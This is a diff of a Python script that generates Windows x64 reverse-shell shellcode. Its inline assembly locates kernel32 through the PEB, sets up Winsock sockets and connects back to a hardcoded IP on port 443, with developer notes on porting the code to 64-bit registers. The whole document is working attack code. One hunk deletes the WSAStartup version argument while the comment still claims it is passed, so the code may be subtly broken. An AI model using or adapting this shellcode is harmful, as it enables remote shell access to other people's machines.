@@ -1,3 +1,22 @@
+"""
+OMER
+
+1902_1154:
+forgot to log, but its in the commit messages
+- adapted by changing registers from e** to r**
+- PEB layout changed, updated offsets to gs0x60, 0x18 & 0x30
+
+typedef struct _UNICODE_STRING {
+  USHORT Length;       // +0x0
+  USHORT MaximumLength;// +0x2
+  PWSTR  Buffer;       // +0x8 (on x64 systems)
+} UNICODE_STRING;
+
+
+
+
+"""
+
 import ctypes
 import platform
 
@@ -31,14 +50,17 @@ def ret_asm() -> str:
     
     FIND_KERNEL32:
         xor rcx, rcx                                ; rcx = 0
-        mov rsi, gs:[rcx + 0x60]                    ; rsi = PEB (Process Environment Block)
-        mov rsi, [rsi + 0x18]                       ; rsi = PEB_LDR_DATA (loader data structure)
-        mov rsi, [rsi + 0x30]                       ; rsi = InInitializationOrderModuleList (first module entry)
+        mov rcx, 60h                                ; rcx = 0x60
+        mov r8, gs:[rcx]                            ; r8 = PEB (Process Environment Block)
+        mov r8, [r8 + 0x18]                         ; r8 = PEB_LDR_DATA (loader data structure)
+        mov r8, [r8 + 0x30]                         ; r8 = InInitializationOrderModuleList (first module entry)
 
     CHECK_NEXT_MODULE:
-        mov rbx, [rsi + 0x30]                       ; rbx = base address of current module
-        mov rdi, [rsi + 0x50]                       ; rdi = pointer to module name (wide string)
-        mov rsi, [rsi]                              ; rsi = next module in linked list (FLINK)
+        mov rbx, [r8 + 0x30]                        ; rbx = base address of current module
+        mov rdi, [r8 + 0x50]                        ; rdi = pointer to module name (wide string)
+        mov r8, [r8]                                ; r8 = next module in linked list (FLINK)
+        cmp byte [rdi], 0x6b                        ; Check if first char is 'k' (0x6b)
+        jne CHECK_NEXT_MODULE                       ; If not kernel32, loop to next module
         cmp [rdi + 12*2], cx                        ; Check for null terminator at offset 24 (12th wide char)
         jne CHECK_NEXT_MODULE                       ; If not kernel32, loop to next module
 
@@ -172,8 +194,6 @@ def ret_asm() -> str:
         sub rax, rcx                               ; rax -= rcx to avoid overwriting stack
         push rax                                    ; Push pointer to WSADATA structure
         xor rax, rax                                ; rax = 0
-        mov ax, 0x0202                              ; AX = MAKEWORD(2,2)
-        push rax                                    ; Push wVersionRequested = MAKEWORD(2,2)
         call [rbp + 0x1C]                           ; Call WSAStartup(MAKEWORD(2,2), &WSADATA)
 
     ; ===== CALL_WSASOCKETA: Setup args and call WSASocketA =====
@@ -219,7 +239,7 @@ def ret_asm() -> str:
         push rax                                    ; Push sin_zero[]
 
         ; PUSH IP AND PORT
-        mov edi, {hexIP("192.168.247.134")}
+        mov edi, {hexIP("192.168.18.52")}
         push rdi
         mov ax, {hexPort(443)}                  
         
@@ -355,7 +375,7 @@ def get_shellcode():
 
     shellcode = b""
     # shellcode += keystone_asm(CODE=asm, debug=True)
-    shellcode += nasm_asm(CODE=asm, arch=64, debug=True)
+    shellcode += nasm_asm(CODE=asm, arch=64, print=True, inject_fixes=True, hex_split="db")
 
     # keystone_asm returns bytes, so we can return it as a bytesarray
     shellcode = bytearray(shellcode)
